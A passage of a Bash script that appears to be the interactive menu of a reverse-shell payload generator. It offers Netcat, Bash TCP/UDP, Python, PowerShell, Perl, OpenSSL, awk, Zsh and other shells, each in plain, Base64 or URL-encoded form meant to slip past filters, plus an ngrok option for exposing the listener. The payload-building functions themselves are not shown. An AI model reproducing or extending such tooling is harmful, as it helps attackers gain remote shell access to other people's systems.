$(blueprint 'Perl')
$(greenprint '1)') No encoding
$(greenprint '2)') Base64 encoded
$(greenprint '3)') URL encoded
$(greenprint '4)') Double URL encoded
$(magentaprint 'm)') Go Back to Main Menu
$(redprint '0)') Exit

Choose an option:  "
    read -r -n 1 ans
    case $ans in
    1)
        perl 
        ;;
    2)
        perl "base64"
        ;;
    3)
        perl "url"
        ;;
    4)
        perl "urlx2"
        ;;
    m)
        mainmenu
        ;;
    0)
        fn_bye
        ;;
    
    *)
        fn_fail
        ;;
    esac
}

submenu_zsh() {
header
    echo -ne "
$(blueprint 'Zsh')
$(greenprint '1)') No encoding
$(greenprint '2)') Base64 encoded
$(greenprint '3)') URL encoded
$(greenprint '4)') Double URL encoded
$(magentaprint 'm)') Go Back to Main Menu
$(redprint '0)') Exit

Choose an option:  "
    read -r -n 1 ans
    case $ans in
    1)
        zsh
        ;;
    2)
        zsh "base64"
        ;;
    3)
        zsh "url"
        ;;
    4)
        zsh "urlx2"
        ;;
    m)
        mainmenu
        ;;
    0)
        fn_bye
        ;;
    
    *)
        fn_fail
        ;;
    esac
}


submenu_bash() {
header
    echo -ne "
$(blueprint 'Bash')
$(greenprint '1)') No encoding TCP
$(greenprint '2)') Base64 encoded TCP
$(greenprint '3)') URL encoded TCP
$(greenprint '4)') Double URL encoded TCP
$(greenprint '5)') No encoding UDP
$(greenprint '6)') Base64 encoded UDP
$(greenprint '7)') URL encoded UDP
$(greenprint '8)') Double URL encoded UDP
$(magentaprint 'm)') Go Back to Main Menu
$(redprint '0)') Exit

Choose an option:  "
    read -r -n 1 ans
    case $ans in
    1)
        bash_i "" "tcp"
        ;;
    2)
        bash_i "base64" "tcp"
        ;;
    3)
        bash_i "url" "tcp"
        ;;
    4)
        bash_i "urlx2" "tcp"
        ;;
    5)
        bash_i "" "udp"
        ;;
    6)
        bash_i "base64" "udp"
        ;;
    7)
        bash_i "url" "udp"
        ;;
    8)
        bash_i "urlx2" "udp"
        ;;
    m)
        mainmenu
        ;;
    0)
        fn_bye
        ;;
    
    *)
        fn_fail
        ;;
    esac
}

submenu_awk() {
header
    echo -ne "
$(blueprint 'awk')
$(greenprint '1)') No encoding
$(greenprint '2)') Base64 encoded
$(greenprint '3)') URL encoded
$(greenprint '4)') Double URL encoded
$(magentaprint 'm)') Go Back to Main Menu
$(redprint '0)') Exit

Choose an option:  "
    read -r -n 1 ans
    case $ans in
    1)
        awk_s 
        ;;
    2)
        awk_s "base64"
        ;;
    3)
        awk_s "url"
        ;;
    4)
        awk_s "urlx2"
        ;;
    m)
        mainmenu
        ;;
    0)
        fn_bye
        ;;
    
    *)
        fn_fail
        ;;
    esac
}

submenu_open_s() {
header
    echo -ne "
$(blueprint 'OpenSSL')
$(greenprint '1)') No encoding
$(greenprint '2)') Base64 encoded
$(greenprint '3)') URL encoded
$(greenprint '4)') Double URL encoded
$(magentaprint 'm)') Go Back to Main Menu
$(redprint '0)') Exit

Choose an option:  "
    read -r -n 1 ans
    case $ans in
    1)
        open_s 
        ;;
    2)
        open_s "base64"
        ;;
    3)
        open_s "url"
        ;;
    4)
        open_s "urlx2"
        ;;
    m)
        mainmenu
        ;;
    0)
        fn_bye
        ;;
    
    *)
        fn_fail
        ;;
    esac
}

submenu_netcat() {
header
    echo -ne "
$(blueprint 'Netcat')
$(greenprint '1)') No encoding
$(greenprint '2)') Base64 encoded
$(greenprint '3)') URL encoded
$(greenprint '4)') Double URL encoded
$(greenprint '5)') Looping, no encoding
$(greenprint '6)') Looping, Base64 encoded
$(greenprint '7)') Looping, URL encoded
$(greenprint '8)') Looping, double URL encoded
$(magentaprint 'm)') Go Back to Main Menu
$(redprint '0)') Exit

Choose an option:  "
    read -r -n 1 ans
    case $ans in
    1)
        netcat 
        ;;
    2)
        netcat "base64"
        ;;
    3)
        netcat "url"
        ;;
    4)
        netcat "urlx2"
        ;;
    5)
        netcat "" "loop"
        ;;
    6)
        netcat "base64" "loop"
        ;;
    7)
        netcat "url" "loop"
        ;;
    8)
        netcat "urlx2" "loop"
        ;;
    m)
        mainmenu
        ;;
    0)
        fn_bye
        ;;
    *)
        fn_fail
        ;;
    esac
}

submenu_python() {
header
    echo -ne "
$(blueprint 'Python')
$(greenprint '1)') Python3 - No encoding
$(greenprint '2)') Python3 - URL encoded
$(greenprint '3)') Python3 - Double URL encoded
$(greenprint '4)') Python2 - No encoding
$(greenprint '5)') Python2 - URL encoded
$(greenprint '6)') Python2 - Double URL encoded
$(greenprint '7)') Windows Python3 - No encoding
$(greenprint '8)') Windows Python3 - URL encoded
$(greenprint '9)') Windows Python3 - Double URL encoded
$(greenprint '10)') Windows Python2 - No encoding
$(greenprint '11)') Windows Python2 - URL encoded
$(greenprint '12)') Windows Python2 - Double URL encoded
$(magentaprint 'm)') Go Back to Main Menu
$(redprint '0)') Exit

Choose an option:  "
    read -r -n 2 ans
    case $ans in
    1)
        python "python3"
        ;;
    2)
        python "python3" "url"
        ;;
    3)
        python "python3" "urlx2"
        ;;
    4)
        python "python"
        ;;
    5)
        python "python" "url"
        ;;
    6)
        python "python" "urlx2"
        ;;
    7)
        python "wpython3"
        ;;
    8)
        python "wpython3" "url"
        ;;
    9)
        python "wpython3" "urlx2"
        ;;
    10)
        python "wpython" 
        ;;
    11)
        python "wpython" "url"
        ;;
    12)
        python "wpython" "urlx2"
        ;;
    m)
        mainmenu
        ;;
    0)
        fn_bye
        ;;
    *)
        fn_fail
        ;;
    esac
}



mainmenu() {
header
if [ $usingngrok == 1 ]
then 
    if [ $(ps -ef | grep -c ngrok) == 2 ]
    then
        echo "🟢 ngrok is running"
    else
        echo "🔴 ngrok is not running"
        usingngrok=0
    fi
fi
if [[ $ngrok_installed == 1 ]]
then 
    ngrok_choice="$(greenprint 'n)') start/stop ngrok"
fi

    echo -ne "
$(magentaprint 'MAIN MENU')
$(greenprint '1)') Powershell
$(greenprint '2)') Netcat
$(greenprint '3)') Bash
$(greenprint '4)') Python
$(greenprint '5)') Ruby
$(greenprint '6)') Perl
$(greenprint '7)') Telnet
$(greenprint '8)') Zsh
$(greenprint '9)') PHP
$(greenprint '10)') Awk
$(greenprint '11)') OpenSSL
$(greenprint '12)') Golang
$ngrok_choice
$(redprint '0)') Exit

Choose an option:  "
    read -r -n 2 ans
    case $ans in
    1)
        input
        submenu_powershell
        ;;
    2)
        input
        submenu_netcat
        ;;
    3)
        input
        submenu_bash
        ;;
    4)
        input
        submenu_python
        ;;
    5)
        input
        submenu_ruby
        ;;
    6)
        input
        submenu_perl
        ;;
    7)
        input
        submenu_telnet
        ;;
    8)
        input
        submenu_zsh
        ;;
    9)
        input
        submenu_php
        ;;
    10)
        input
        submenu_awk
        ;;
    11)
        input
        submenu_open_s
        ;;
    12)
        input
        submenu_go_lang
        ;;
    n)
        input "ngrok"
        start_ngrok 
        ;;
    0)
        fn_bye
        ;;
    *)
        fn_fail
        ;;
    esac
}

mainmenu
